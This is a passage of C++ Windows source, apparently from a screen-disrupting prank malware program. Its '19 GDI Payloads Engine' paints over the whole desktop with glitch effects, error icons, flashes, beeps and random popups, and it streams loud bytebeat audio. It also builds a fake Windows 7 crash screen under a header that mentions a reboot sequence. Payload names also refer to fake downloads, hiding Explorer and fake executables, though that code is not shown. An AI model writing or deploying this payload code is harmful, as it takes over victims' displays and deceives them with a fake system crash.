        }
        case FX_SHD_36_WARP_LENS: {
            double d2 = cx * cx + cy * cy;
            double k = 1.0 + 0.8 * std::sin(t * 1.2) * d2;
            int lx = (int)((cx * k + 0.5) * 255.0) & 255;
            int ly = (int)((cy * k + 0.5) * 255.0) & 255;
            r = ClampByte(sr ^ lx);
            g = ClampByte(sg ^ ly);
            b = ClampByte(sb ^ (lx ^ ly));
            break;
        }
        case FX_SHD_37_META_STACK:
        default: {
            double v1 = std::sin(fx * 18.0 + t) * std::cos(fy * 18.0 - t);
            int v2 = ((x + step * 7) ^ (y - step * 5)) & 255;
            int m = (int)((v1 + 1.0) * 90.0) ^ v2;
            r = ClampByte((sr + m) & 255);
            g = ClampByte((sg ^ (m >> 1)) & 255);
            b = ClampByte((sb + (255 - m)) & 255);
            break;
        }
    }

    return MakeRgb((unsigned char)r, (unsigned char)g, (unsigned char)b);
}

static void ApplyPixelShaderPass(HDC hdc, int sw, int sh, int shaderIdx, int step) {
    if (sw <= 0 || sh <= 0) return;

    const int w = std::min(sw, 480);
    const int h = std::min(sh, 360);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pBits = nullptr;
    HBITMAP hDib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
    if (!hDib || !pBits) return;

    HDC memDc = CreateCompatibleDC(hdc);
    HGDIOBJ oldBmp = SelectObject(memDc, hDib);

    if (g_osInfo.era >= OS_ERA_WIN2K) {
        SetStretchBltMode(memDc, COLORONCOLOR);
    }
    StretchBlt(memDc, 0, 0, w, h, hdc, 0, 0, sw, sh, SRCCOPY);
    GdiFlush();

    std::uint32_t* px = (std::uint32_t*)pBits;
#ifdef _OPENMP
#pragma omp parallel for schedule(dynamic, 16)
#endif
    for (int y = 0; y < h; ++y) {
        int row = y * w;
        for (int x = 0; x < w; ++x) {
            px[row + x] = ShadePixel(shaderIdx, x, y, w, h, step, px[row + x]);
        }
    }

    if (g_osInfo.era >= OS_ERA_WIN2K) {
        SetStretchBltMode(hdc, HALFTONE);
    }
    StretchBlt(hdc, 0, 0, sw, sh, memDc, 0, 0, w, h, SRCCOPY);

    SelectObject(memDc, oldBmp);
    DeleteDC(memDc);
    DeleteObject(hDib);
}

// --- 19 GDI Payloads Engine ---

static void FillSemiTransparentColor(HDC hdc, int sw, int sh, unsigned char r, unsigned char g, unsigned char b, unsigned char alpha) {
    if (sw <= 0 || sh <= 0 || alpha == 0) return;

    const int cw = 160;
    const int ch = 160;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = cw;
    bmi.bmiHeader.biHeight = -ch;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pBits = nullptr;
    HBITMAP hDib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
    if (!hDib || !pBits) return;

    unsigned char pr = (unsigned char)(((int)r * (int)alpha) / 255);
    unsigned char pg = (unsigned char)(((int)g * (int)alpha) / 255);
    unsigned char pb = (unsigned char)(((int)b * (int)alpha) / 255);
    std::uint32_t argb = ((std::uint32_t)alpha << 24) | ((std::uint32_t)pr << 16) | ((std::uint32_t)pg << 8) | (std::uint32_t)pb;

    std::uint32_t* px = (std::uint32_t*)pBits;
    for (int i = 0; i < cw * ch; ++i) {
        px[i] = argb;
    }

    HDC memDc = CreateCompatibleDC(hdc);
    HGDIOBJ oldBmp = SelectObject(memDc, hDib);

    HBRUSH hatch = CreateHatchBrush(HS_DIAGCROSS, RGB(r, g, b));
    HGDIOBJ oldBr = SelectObject(memDc, hatch);
    PatBlt(memDc, 0, 0, cw, ch, PATINVERT);
    SelectObject(memDc, oldBr);
    DeleteObject(hatch);

    if (g_pfnAlphaBlend) {
        BLENDFUNCTION bf = { 0 };
        bf.BlendOp = AC_SRC_OVER;
        bf.BlendFlags = 0;
        bf.SourceConstantAlpha = 255;
        bf.AlphaFormat = AC_SRC_ALPHA;
        for (int pass = 0; pass < 3; ++pass) {
            g_pfnAlphaBlend(hdc, 0, 0, sw, sh, memDc, 0, 0, cw, ch, bf);
        }
    } else {
        for (int pass = 0; pass < 2; ++pass) {
            StretchBlt(hdc, 0, 0, sw, sh, memDc, 0, 0, cw, ch, SRCPAINT);
        }
    }

    SelectObject(memDc, oldBmp);
    DeleteDC(memDc);
    DeleteObject(hDib);
}

static void DrawSierpinskiTriangles(HDC hdc, int sw, int sh, int step) {
    int baseSize = 240 + ((step * 47) % 340);
    int ox = (std::rand() % std::max(1, sw - baseSize));
    int oy = (std::rand() % std::max(1, sh - baseSize));

    COLORREF col = RGB(std::rand() & 255, std::rand() & 255, std::rand() & 255);
    HPEN pen = CreatePen(PS_SOLID, 1, col);
    HGDIOBJ oldPen = SelectObject(hdc, pen);

    struct Tri { int x1, y1, x2, y2, x3, y3, depth; };
    Tri stack[1024];
    int sp = 0;
    stack[sp++] = { ox + baseSize / 2, oy, ox, oy + baseSize, ox + baseSize, oy + baseSize, 6 };

    while (sp > 0) {
        Tri t = stack[--sp];
        if (t.depth <= 0) {
            MoveToEx(hdc, t.x1, t.y1, nullptr);
            LineTo(hdc, t.x2, t.y2);
            LineTo(hdc, t.x3, t.y3);
            LineTo(hdc, t.x1, t.y1);
        } else {
            int mx12 = (t.x1 + t.x2) / 2, my12 = (t.y1 + t.y2) / 2;
            int mx23 = (t.x2 + t.x3) / 2, my23 = (t.y2 + t.y3) / 2;
            int mx31 = (t.x3 + t.x1) / 2, my31 = (t.y3 + t.y1) / 2;
            if (sp + 3 <= 1024) {
                stack[sp++] = { t.x1, t.y1, mx12, my12, mx31, my31, t.depth - 1 };
                stack[sp++] = { mx12, my12, t.x2, t.y2, mx23, my23, t.depth - 1 };
                stack[sp++] = { mx31, my31, mx23, my23, t.x3, t.y3, t.depth - 1 };
            }
        }
    }

    SelectObject(hdc, oldPen);
    DeleteObject(pen);
}

static void DrawRainbowXorOverlay(HDC hdc, int sw, int sh, int step) {
    if (sw <= 0 || sh <= 0) return;
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = sw;
    bmi.bmiHeader.biHeight = -sh;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HBITMAP dib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, nullptr, 0);
    if (!dib || !bits) return;

    std::uint32_t* px = (std::uint32_t*)bits;
    int shiftX = (step * 13) & 255;
    int shiftY = (step * 9) & 255;

#ifdef _OPENMP
#pragma omp parallel for schedule(dynamic, 16)
#endif
    for (int y = 0; y < sh; ++y) {
        int yy = ((y + shiftY) * 3) & 255;
        double wy = std::sin((double)(y + step) * 0.03) * 16.0;
        for (int x = 0; x < sw; ++x) {
            int xx = (((x + shiftX + (int)wy) * 2)) & 255;
            unsigned char v = (unsigned char)((xx ^ yy) & 255);
            unsigned char r = (unsigned char)((v * 3 + step * 13) & 255);
            unsigned char g = (unsigned char)((v * 5 + step * 29 + 85) & 255);
            unsigned char b = (unsigned char)((v * 7 + step * 47 + 170) & 255);
            px[y * sw + x] = MakeRgb(r, g, b);
        }
    }

    HDC mem = CreateCompatibleDC(hdc);
    HGDIOBJ old = SelectObject(mem, dib);
    if (g_osInfo.era >= OS_ERA_WIN2K) {
        SetStretchBltMode(hdc, HALFTONE);
    }
    StretchBlt(hdc, 0, 0, sw, sh, mem, 0, 0, sw, sh, (step & 1) ? SRCINVERT : SRCPAINT);
    SelectObject(mem, old);
    DeleteDC(mem);
    DeleteObject(dib);
}

static void DrawRotatedScaledIcon(HDC hdc, HICON hIcon, int cx, int cy, int w, int h, double angleRad) {
    if (!hIcon) return;
    HDC icDc = CreateCompatibleDC(hdc);
    HBITMAP icBmp = CreateCompatibleBitmap(hdc, 64, 64);
    HGDIOBJ oldIcBmp = SelectObject(icDc, icBmp);

    RECT r0 = { 0, 0, 64, 64 };
    HBRUSH bg = CreateSolidBrush(RGB(255, 0, 255));
    FillRect(icDc, &r0, bg);
    DeleteObject(bg);
    DrawIcon(icDc, 0, 0, hIcon);

    bool usedWorldXf = false;
    int prevMode = GM_COMPATIBLE;
    XFORM prevXf = { 0 };

    if (g_osInfo.era >= OS_ERA_WIN2K && g_pfnSetGraphicsMode && g_pfnSetWorldTransform && g_pfnGetWorldTransform) {
        double c = std::cos(angleRad);
        double s = std::sin(angleRad);
        XFORM xf = { 0 };
        xf.eM11 = (FLOAT)c;
        xf.eM12 = (FLOAT)s;
        xf.eM21 = (FLOAT)(-s);
        xf.eM22 = (FLOAT)c;
        xf.eDx = (FLOAT)cx;
        xf.eDy = (FLOAT)cy;

        prevMode = g_pfnSetGraphicsMode(hdc, GM_ADVANCED);
        if (prevMode != 0) {
            g_pfnGetWorldTransform(hdc, &prevXf);
            g_pfnSetWorldTransform(hdc, &xf);
            usedWorldXf = true;
        }
    }

    int drawX = usedWorldXf ? (-w / 2) : (cx - w / 2);
    int drawY = usedWorldXf ? (-h / 2) : (cy - h / 2);

    if (g_pfnTransparentBlt) {
        g_pfnTransparentBlt(hdc, drawX, drawY, w, h, icDc, 0, 0, 64, 64, RGB(255, 0, 255));
    } else {
        StretchBlt(hdc, drawX, drawY, w, h, icDc, 0, 0, 64, 64, SRCCOPY);
    }

    if (usedWorldXf) {
        g_pfnSetWorldTransform(hdc, &prevXf);
        g_pfnSetGraphicsMode(hdc, prevMode);
    }

    SelectObject(icDc, oldIcBmp);
    DeleteObject(icBmp);
    DeleteDC(icDc);
}

static void DrawHourglass(HDC hdc, int cx, int cy, int radius, double angleRad, COLORREF col) {
    double c = std::cos(angleRad);
    double s = std::sin(angleRad);

    auto rotPt = [&](double lx, double ly) -> POINT {
        POINT p;
        p.x = (LONG)(cx + lx * c - ly * s);
        p.y = (LONG)(cy + lx * s + ly * c);
        return p;
    };

    POINT pts[6];
    pts[0] = rotPt(-radius, -radius);
    pts[1] = rotPt(radius, -radius);
    pts[2] = rotPt(0, 0);
    pts[3] = rotPt(radius, radius);
    pts[4] = rotPt(-radius, radius);
    pts[5] = rotPt(0, 0);

    HBRUSH br = CreateSolidBrush(col);
    HPEN pen = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
    HGDIOBJ oldBr = SelectObject(hdc, br);
    HGDIOBJ oldPen = SelectObject(hdc, pen);

    int prevFill = SetPolyFillMode(hdc, WINDING);
    Polygon(hdc, pts, 3);
    Polygon(hdc, pts + 3, 3);
    SetPolyFillMode(hdc, prevFill);

    POINT capTop[2] = { rotPt(-radius * 1.15, -radius), rotPt(radius * 1.15, -radius) };
    POINT capBot[2] = { rotPt(-radius * 1.15, radius), rotPt(radius * 1.15, radius) };
    MoveToEx(hdc, capTop[0].x, capTop[0].y, nullptr);
    LineTo(hdc, capTop[1].x, capTop[1].y);
    MoveToEx(hdc, capBot[0].x, capBot[0].y, nullptr);
    LineTo(hdc, capBot[1].x, capBot[1].y);

    SelectObject(hdc, oldPen);
    SelectObject(hdc, oldBr);
    DeleteObject(pen);
    DeleteObject(br);
}

static void ApplyScreenRotoZoom(HDC hdc, int sw, int sh, double angleRad, double scale) {
    HDC snapDc = CreateCompatibleDC(hdc);
    HBITMAP snapBmp = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ oldSnap = SelectObject(snapDc, snapBmp);
    BitBlt(snapDc, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    bool usedWorldXf = false;
    int prevMode = GM_COMPATIBLE;
    XFORM prevXf = { 0 };

    if (g_osInfo.era >= OS_ERA_WIN2K && g_pfnSetGraphicsMode && g_pfnSetWorldTransform && g_pfnGetWorldTransform) {
        double c = std::cos(angleRad) * scale;
        double s = std::sin(angleRad) * scale;
        XFORM xf = { 0 };
        xf.eM11 = (FLOAT)c;
        xf.eM12 = (FLOAT)s;
        xf.eM21 = (FLOAT)(-s);
        xf.eM22 = (FLOAT)c;
        xf.eDx = (FLOAT)(sw / 2.0 - (sw / 2.0) * c + (sh / 2.0) * s);
        xf.eDy = (FLOAT)(sh / 2.0 - (sw / 2.0) * s - (sh / 2.0) * c);

        prevMode = g_pfnSetGraphicsMode(hdc, GM_ADVANCED);
        if (prevMode != 0) {
            g_pfnGetWorldTransform(hdc, &prevXf);
            g_pfnSetWorldTransform(hdc, &xf);
            usedWorldXf = true;
        }
    }

    for (int pass = 0; pass < 2; ++pass) {
        BitBlt(hdc, 0, 0, sw, sh, snapDc, 0, 0, SRCCOPY);
    }

    if (usedWorldXf) {
        g_pfnSetWorldTransform(hdc, &prevXf);
        g_pfnSetGraphicsMode(hdc, prevMode);
    }

    SelectObject(snapDc, oldSnap);
    DeleteObject(snapBmp);
    DeleteDC(snapDc);
}

static void ApplyPayloadStep(HDC hdc, int sw, int sh, int payloadIdx, int step) {
    if (g_finalSequenceStarted) return;

    switch (payloadIdx) {
        case 0: { // FX_PLD_00_UP_RIGHT
            int dx = 20 + (std::rand() % 36);
            int dy = -(20 + (std::rand() % 36));
            BitBlt(hdc, dx, dy, sw, sh, hdc, 0, 0, SRCCOPY);
            break;
        }
        case 1: { // FX_PLD_01_HUE_SLEEP
            unsigned char r = (unsigned char)((step * 43) & 255);
            unsigned char g = (unsigned char)((step * 97 + 60) & 255);
            unsigned char b = (unsigned char)((step * 151 + 120) & 255);
            FillSemiTransparentColor(hdc, sw, sh, r, g, b, 85);
            break;
        }
        case 2: { // FX_PLD_02_SIERPINSKI
            DrawSierpinskiTriangles(hdc, sw, sh, step);
            break;
        }
        case 3: { // FX_PLD_03_RAINBOW_XOR
            DrawRainbowXorOverlay(hdc, sw, sh, step);
            break;
        }
        case 4: { // FX_PLD_04_ERR_ICON_ROTOZOOM
            HICON hErr = LoadIconA(nullptr, MAKEINTRESOURCEA(32513));
            for (int pass = 0; pass < 4; ++pass) {
                int cx = std::rand() % std::max(1, sw);
                int cy = std::rand() % std::max(1, sh);
                double zoom = 0.6 + (((step + pass) % 10) * 0.2);
                int sz = (int)(32.0 * zoom);
                double ang = ((step + pass) * 0.35);
                DrawRotatedScaledIcon(hdc, hErr, cx, cy, sz, sz, ang);
            }
            break;
        }
        case 5: { // FX_PLD_05_FLASH_RED
            if ((step % 2) == 0) {
                FillSemiTransparentColor(hdc, sw, sh, 220, 0, 0, 95);
            }
            break;
        }
        case 6: { // FX_PLD_06_ERROR_SOUNDS
            if ((step % 6) == 0) {
                MessageBeep(MB_ICONERROR);
            }
            break;
        }
        case 7: { // FX_PLD_07_INVERT_CIRCLE
            HBRUSH br = CreateSolidBrush(RGB(255, 255, 255));
            HGDIOBJ oldBr = SelectObject(hdc, br);
            int prevRop = SetROP2(hdc, R2_NOT);
            for (int pass = 0; pass < 4; ++pass) {
                int rad = 35 + (std::rand() % 110);
                int cx = std::rand() % std::max(1, sw);
                int cy = std::rand() % std::max(1, sh);
                Ellipse(hdc, cx - rad, cy - rad, cx + rad, cy + rad);
            }
            SetROP2(hdc, prevRop);
            SelectObject(hdc, oldBr);
            DeleteObject(br);
            break;
        }
        case 8: { // FX_PLD_08_WARN_ICON_STRETCH
            HICON hWarn = LoadIconA(nullptr, MAKEINTRESOURCEA(32515));
            if (g_osInfo.era >= OS_ERA_WIN2K) {
                SetStretchBltMode(hdc, HALFTONE);
            }
            for (int pass = 0; pass < 4; ++pass) {
                int x = std::rand() % std::max(1, sw - 40);
                int y = std::rand() % std::max(1, sh - 40);
                int w = 24 + (std::rand() % 120);
                int h = 24 + (std::rand() % 120);
                DrawIconEx(hdc, x, y, hWarn, w, h, 0, nullptr, DI_NORMAL);
            }
            break;
        }
        case 9: { // FX_PLD_09_RANDOM_WINDOWS
            if ((step % 7) == 0) {
                TriggerRandomPopupWindow(sw, sh);
            }
            break;
        }
        case 10: { // FX_PLD_10_DARKEN
            FillSemiTransparentColor(hdc, sw, sh, 0, 0, 0, 80);
            break;
        }
        case 11: { // FX_PLD_11_PIXELATE
            int block = 10 + ((step * 5) % 24);
            int smallW = std::max(1, sw / block);
            int smallH = std::max(1, sh / block);
            HDC mem = CreateCompatibleDC(hdc);
            HBITMAP smBmp = CreateCompatibleBitmap(hdc, smallW, smallH);
            HGDIOBJ old = SelectObject(mem, smBmp);
            if (g_osInfo.era >= OS_ERA_WIN2K) {
                SetStretchBltMode(mem, HALFTONE);
                SetStretchBltMode(hdc, HALFTONE);
            }
            StretchBlt(mem, 0, 0, smallW, smallH, hdc, 0, 0, sw, sh, SRCCOPY);
            StretchBlt(hdc, 0, 0, sw, sh, mem, 0, 0, smallW, smallH, SRCCOPY);
            SelectObject(mem, old);
            DeleteObject(smBmp);
            DeleteDC(mem);
            break;
        }
        case 12: { // FX_PLD_12_CORNER_ICONS
            HICON hErr = LoadIconA(nullptr, MAKEINTRESOURCEA(32513));
            HICON hWarn = LoadIconA(nullptr, MAKEINTRESOURCEA(32515));
            int pad = 16;
            DrawIconEx(hdc, pad, pad, hErr, 48, 48, 0, nullptr, DI_NORMAL);
            DrawIconEx(hdc, sw - 48 - pad, pad, hWarn, 48, 48, 0, nullptr, DI_NORMAL);
            DrawIconEx(hdc, pad, sh - 48 - pad, hWarn, 48, 48, 0, nullptr, DI_NORMAL);
            DrawIconEx(hdc, sw - 48 - pad, sh - 48 - pad, hErr, 48, 48, 0, nullptr, DI_NORMAL);
            break;
        }
        case 13: { // FX_PLD_13_DOWNLOAD_MSGBOX
            if ((step % 24) == 0) {
                TriggerDownloadPrompt();
            }
            break;
        }
        case 14: { // FX_PLD_14_HOURGLASSES
            for (int i = 0; i < 6; ++i) {
                int cx = std::rand() % std::max(1, sw);
                int cy = std::rand() % std::max(1, sh);
                int rad = 18 + (std::rand() % 36);
                double ang = ((double)(std::rand() % 360)) * 3.14159265 / 180.0;
                COLORREF col = RGB(std::rand() & 255, std::rand() & 255, std::rand() & 255);
                DrawHourglass(hdc, cx, cy, rad, ang, col);
            }
            break;
        }
        case 15: { // FX_PLD_15_SCREEN_ROTOZOOM
            double ang = std::sin(step * 0.25) * 0.14;
            double zoom = 0.92 + 0.14 * std::cos(step * 0.2);
            ApplyScreenRotoZoom(hdc, sw, sh, ang, zoom);
            break;
        }
        case 16: { // FX_PLD_16_EXPLORER_SCAN_HIDE
            g_explorerHideStep = step;
            break;
        }
        case 17: { // FX_PLD_17_FAKE_16BIT_EXE
            if ((step % 15) == 0) {
                TriggerFake16BitGarbageExe(step);
            }
            break;
        }
        case 18:
        default: { // FX_PLD_18_FAKE_VBS_WSCRIPT_ERR
            if ((step % 16) == 0) {
                TriggerFakeWScriptErrorVbs(step);
            }
            break;
        }
    }
}

static void ApplyGdiEffectStep(HDC hdc, int sw, int sh, GdiEffectType fx, int step) {
    if (g_finalSequenceStarted) return;
    if ((int)fx < (int)kNumShaders) {
        ApplyPixelShaderPass(hdc, sw, sh, (int)fx, step);
    } else {
        int payloadIdx = (int)fx - (int)kNumShaders;
        ApplyPayloadStep(hdc, sw, sh, payloadIdx, step);
    }
}

static void RollOverlappingEffects(GdiEffectType* outPool, int& outCount, unsigned int salt) {
    std::srand(MixEntropySeed(salt));
    EnterCriticalSection(&g_stateCs);
    outCount = 4 + (std::rand() % (kMaxConcurrentEffects - 3));
    for (int i = 0; i < outCount; ++i) {
        GdiEffectType cand;
        bool dup;
        do {
            if ((i & 1) == 0) {
                cand = (GdiEffectType)(std::rand() % kNumShaders);
            } else {
                cand = (GdiEffectType)(kNumShaders + (std::rand() % kNumPayloads));
            }
            dup = false;
            for (int j = 0; j < i; ++j) {
                if (outPool[j] == cand) {
                    dup = true;
                    break;
                }
            }
        } while (dup);
        outPool[i] = cand;
    }
    LeaveCriticalSection(&g_stateCs);
}

static DWORD WINAPI SynchronizedGdiEffectsThread(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
#ifdef _OPENMP
    omp_set_num_threads(4);
#endif

    DWORD lastSeenEpoch = 0;
    DWORD lastWindowIdx = 0;

    GdiEffectType activePool[kMaxConcurrentEffects];
    int poolCount = 0;
    RollOverlappingEffects(activePool, poolCount, 0xA11u);

    DWORD trackStartTick = GetTickCount();
    int step = 0;

    while (g_audioRunning && !g_finalSequenceStarted) {
        if (!g_bsodEnded || g_activeTrackIdx < 0) {
            Sleep(15);
            continue;
        }

        TouchSafeRuntimeApis();

        DWORD curEpoch = g_trackEpoch;
        if (curEpoch != lastSeenEpoch) {
            lastSeenEpoch = curEpoch;
            trackStartTick = GetTickCount();
            lastWindowIdx = 0;
            step = 0;
            RollOverlappingEffects(activePool, poolCount, curEpoch * 7919u + 13u);
        }

        DWORD elapsedMs = GetTickCount() - trackStartTick;
        DWORD curWindowIdx = elapsedMs / kEffectWindowMs;
        if (curWindowIdx != lastWindowIdx) {
            lastWindowIdx = curWindowIdx;
            step = 0;
            RollOverlappingEffects(activePool, poolCount, curWindowIdx * 104729u + curEpoch * 31u);
        } else if (step > 0 && (step % 35) == 0) {
            RollOverlappingEffects(activePool, poolCount, (unsigned int)step * 65537u + curEpoch);
        }

        if (g_finalSequenceStarted) break;

        HDC scrDc = GetDC(nullptr);
        if (scrDc) {
            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            const int renderPasses = 3;
            for (int p = 0; p < renderPasses && !g_finalSequenceStarted; ++p) {
                for (int i = 0; i < poolCount && !g_finalSequenceStarted; ++i) {
                    ApplyGdiEffectStep(scrDc, sw, sh, activePool[i], step + i * 5 + p * 3);
                }
            }
            GdiFlush();
            ReleaseDC(nullptr, scrDc);
        }

        ++step;
        InterruptibleSleep(2);
    }

    return 0;
}

// --- Audio Streaming ---

static void StreamWaveAudio(
    DWORD sampleRate,
    double startT,
    double maxT,
    bool (*fn)(void* ctx, double t),
    void* ctx,
    unsigned char (*evalSingle)(void* ctx, double t)
) {
    const int numBuffers = 4;
    const int bufferSamples = 2048;

    WAVEFORMATEX wfx = { 0 };
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = sampleRate;
    wfx.wBitsPerSample = 8;
    wfx.nBlockAlign = wfx.nChannels * (wfx.wBitsPerSample / 8);
    wfx.nAvgBytesPerSec = sampleRate * wfx.nBlockAlign;

    HWAVEOUT hWaveOut = nullptr;
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return;
    }

    WAVEHDR headers[numBuffers];
    BYTE* buffers[numBuffers];
    for (int i = 0; i < numBuffers; ++i) {
        buffers[i] = new BYTE[bufferSamples];
        ZeroMemory(&headers[i], sizeof(WAVEHDR));
        headers[i].lpData = (LPSTR)buffers[i];
        headers[i].dwBufferLength = bufferSamples;
        waveOutPrepareHeader(hWaveOut, &headers[i], sizeof(WAVEHDR));
    }

    double t = startT;
    int currentBuf = 0;

    while (g_audioRunning && !g_finalSequenceStarted) {
        if (maxT >= 0.0 && t >= maxT) {
            break;
        }
        if (fn && !fn(ctx, t)) {
            break;
        }

        WAVEHDR* hdr = &headers[currentBuf];
        if (hdr->dwFlags & WHDR_INQUEUE) {
            Sleep(5);
            continue;
        }

        int count = 0;
        for (int i = 0; i < bufferSamples; ++i) {
            if (!g_audioRunning || g_finalSequenceStarted) break;
            if (maxT >= 0.0 && t >= maxT) {
                break;
            }
            buffers[currentBuf][i] = evalSingle(ctx, t);
            t += 1.0;
            g_currentT = t;
            ++count;
        }

        if (count > 0) {
            hdr->dwBufferLength = (DWORD)count;
            waveOutWrite(hWaveOut, hdr, sizeof(WAVEHDR));
            currentBuf = (currentBuf + 1) % numBuffers;
        }
    }

    waveOutReset(hWaveOut);
    for (int i = 0; i < numBuffers; ++i) {
        waveOutUnprepareHeader(hWaveOut, &headers[i], sizeof(WAVEHDR));
        delete[] buffers[i];
    }
    waveOutClose(hWaveOut);
}

static bool IntroTickCheck(void* ctx, double t) {
    (void)ctx;
    if (t >= 923140.0) {
        g_bsodEnded = true;
        HWND hWnd = g_hBsodWnd;
        if (hWnd && IsWindow(hWnd)) {
            PostMessageA(hWnd, kCloseBsodMsgId, 0, 0);
        }
        return false;
    }
    return true;
}

static unsigned char IntroEvalSample(void* ctx, double t) {
    (void)ctx;
    return EvalIntroBsodBytebeat(t);
}

struct TrackCtx {
    int trackIdx;
};

static bool AlwaysTrueCheck(void* ctx, double t) {
    (void)ctx;
    (void)t;
    return true;
}

static unsigned char TrackEvalSample(void* ctx, double t) {
    TrackCtx* tctx = (TrackCtx*)ctx;
    return EvalRandomTrack(tctx->trackIdx, t);
}

static DWORD WINAPI BytebeatThreadProc(LPVOID lpParam) {
    (void)lpParam;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    std::srand(MixEntropySeed(0x51C0u));

    g_currentT = 0.0;
    StreamWaveAudio(48000, 0.0, 923140.0, IntroTickCheck, nullptr, IntroEvalSample);

    if (!g_audioRunning || g_finalSequenceStarted) {
        return 0;
    }

    g_bsodEnded = true;
    g_hGdiEffectsThread = CreateThread(nullptr, 0, SynchronizedGdiEffectsThread, nullptr, 0, nullptr);

    int lastTrack = -1;
    unsigned int roundCounter = 1;
    while (g_audioRunning && !g_finalSequenceStarted) {
        std::srand(MixEntropySeed(roundCounter * 48271u));
        int trackIdx = PickRandomTrackIndex(lastTrack);
        lastTrack = trackIdx;
        int rate = GetTrackSampleRate(trackIdx);
        double durationSamples = (double)rate * kBytebeatTrackDurationSec;

        TrackCtx tctx;
        tctx.trackIdx = trackIdx;
        g_currentT = 0.0;
        g_activeTrackIdx = trackIdx;
        ++g_trackEpoch;
        ++roundCounter;

        StreamWaveAudio((DWORD)rate, 0.0, durationSamples, AlwaysTrueCheck, &tctx, TrackEvalSample);
    }

    return 0;
}

// --- Stretched Fake Windows 7 BSOD (800x600) + Black Flash + Reboot Sequence ---

static void CreateWin7BsodBitmap800x600(HDC refDc) {
    HDC memDc = CreateCompatibleDC(refDc);
    g_hBsodBmp = CreateCompatibleBitmap(refDc, kBufW, kBufH);
    HGDIOBJ oldBmp = SelectObject(memDc, g_hBsodBmp);

    // Classic Windows 7 STOP screen royal/navy blue
    HBRUSH bgBrush = CreateSolidBrush(RGB(14, 46, 128));
    RECT fullRect = { 0, 0, kBufW, kBufH };
    FillRect(memDc, &fullRect, bgBrush);
    DeleteObject(bgBrush);

    SetBkMode(memDc, TRANSPARENT);
    SetTextColor(memDc, RGB(242, 245, 255));

    HFONT hFont = CreateFontA(
        18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, FIXED_PITCH | FF_MODERN, "Lucida Console"
    );
    HGDIOBJ oldFont = SelectObject(memDc, hFont);

    const char* lines[] = {
        "A problem has been detected and Windows has been shut down to prevent damage",
        "to your computer.",
        "",
        "SETROXIDE_TIMER_EXPIRED_KERNEL_FAULT",
        "",
        "If this is the first time you've seen this Stop error screen,",
        "restart your computer. If this screen appears again, follow",
        "these steps:",
        "",
        "Check to be sure any new hardware or software is properly installed.",
        "If this is a new installation, ask your hardware or software manufacturer",
        "for any Windows updates you might need.",
        "",
        "If problems continue, disable or remove any newly installed BIOS options",
        "such as caching or shadowing. If you need to use Safe Mode to remove or",
        "disable components, restart your computer, press F8 to select Advanced",
        "Startup Options, and then select Safe Mode.",
        "",
        "Technical information:",
        "",
        "*** STOP: 0x000000F4 (0x00000003, 0x84A19C20, 0x84A19D6C, 0xC0000005)",
        "",
        "Collecting data for crash dump ...",
        "Initializing disk for crash dump ...",
        "Beginning dump of physical memory.",
        "Dumping physical memory to disk: 100",
        "Physical memory dump complete.",
        "Contact your system administrator or technical support group for further",
        "assistance."
    };

    int y = 24;
    for (size_t i = 0; i < sizeof(lines) / sizeof(lines[0]); ++i) {
        RECT r = { 32, y, kBufW - 32, y + 19 };
        DrawTextA(memDc, lines[i], -1, &r, DT_LEFT | DT_SINGLELINE | DT_NOPREFIX);
        y += 19;
    }

    SelectObject(memDc, oldFont);
    DeleteObject(hFont);
    SelectObject(memDc, oldBmp);
    DeleteDC(memDc);
}

static void CreateFrameDib800x600(HDC refDc) {
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = kBufW;
    bmi.bmiHeader.biHeight = -kBufH;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* pBits = nullptr;
    g_hFrameBmp = CreateDIBSection(refDc, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
    g_pFramePixels = (std::uint32_t*)pBits;
}

static void RenderCurrentStage800x600(HDC refDc, double t) {
    if (!g_hFrameBmp || !g_pFramePixels) return;

    HDC frameDc = CreateCompatibleDC(refDc);
    HGDIOBJ oldFrameBmp = SelectObject(frameDc, g_hFrameBmp);

    if (g_finalWin7BsodActive) {
        HDC bsodDc = CreateCompatibleDC(refDc);
        HGDIOBJ oldBsodBmp = SelectObject(bsodDc, g_hBsodBmp);
        BitBlt(frameDc, 0, 0, kBufW, kBufH, bsodDc, 0, 0, SRCCOPY);
        SelectObject(bsodDc, oldBsodBmp);
